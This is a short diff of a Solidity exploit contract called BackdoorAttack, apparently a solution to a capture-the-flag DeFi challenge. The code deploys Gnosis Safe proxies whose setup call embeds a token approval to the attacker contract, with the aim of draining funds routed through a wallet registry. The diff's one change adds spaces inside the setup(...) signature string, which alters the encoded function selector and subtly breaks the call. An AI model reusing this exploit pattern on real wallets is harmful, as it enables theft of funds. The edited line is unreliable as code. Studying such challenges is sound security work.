@@ -56,7 +56,7 @@ contract BackdoorAttack {
             // in walletRegister will trigger proxyCreated().
             bytes memory encodedApprove = abi.encodeWithSignature("approve(address)", address(this));
             bytes memory initializer = abi.encodeWithSignature(
-                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                "setup(address[], uint256, address, bytes, address, address, uint256, address)",
                 owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
             GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(masterCopy, initializer, 0, IProxyCreationCallback(walletRegister));
 
